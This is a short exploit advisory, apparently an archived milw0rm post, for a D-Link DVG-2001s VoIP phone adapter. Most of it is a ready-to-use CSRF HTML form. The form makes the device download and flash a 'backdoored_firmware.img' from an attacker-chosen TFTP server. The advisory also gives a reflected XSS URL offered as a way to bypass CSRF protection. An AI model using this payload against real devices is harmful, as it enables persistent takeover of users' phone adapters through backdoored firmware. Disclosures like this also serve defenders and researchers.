<html><head><title>D-Link VoIP Phone Adapter XSS/XSRF Remote Firmware Overwrite</title></head><pre>D-link VoIP Phone Adapter XSS and XSRF(remote firmware overwrite)
model number: DVG-2001s
f/w version 1.00.007

Better than just remote code execution,  you control the firmware.

&lt;html&gt;
	&lt;form action=&quot;http://10.1.1.166/Forms/cbi_Set_SW_Update?16640,0,0,0,0,0,0,0,0&quot;
method=&quot;POST&quot;&gt;
		&lt;input name=&quot;page_HiddenVar&quot; value=&quot;0&quot;&gt;
		&lt;input name=&quot;TFTPServerAddress1&quot; value=&quot;10&quot;&gt;
		&lt;input name=&quot;TFTPServerAddress2&quot; value=&quot;1&quot;&gt;
		&lt;input name=&quot;TFTPServerAddress3&quot; value=&quot;1&quot;&gt;
		&lt;input name=&quot;TFTPServerAddress4&quot; value=&quot;1&quot;&gt;
		&lt;input name=&quot;FirmwareUpdate&quot; value=&quot;enabled&quot;&gt;
		&lt;input name=&quot;FileName&quot; value=&quot;backdoored_firmware.img&quot;&gt;
		&lt;input type=submit value=&quot;attack&quot;&gt;
	&lt;/form&gt;
&lt;/html&gt;
and xss which can be used for csrf bypass:
http://10.1.1.166/Forms/page_CfgDevInfo_Set?%3Cscript%3Ealert(%22hacked%22)%3C/script%3E

# milw0rm.com [2009-01-29]</pre></html>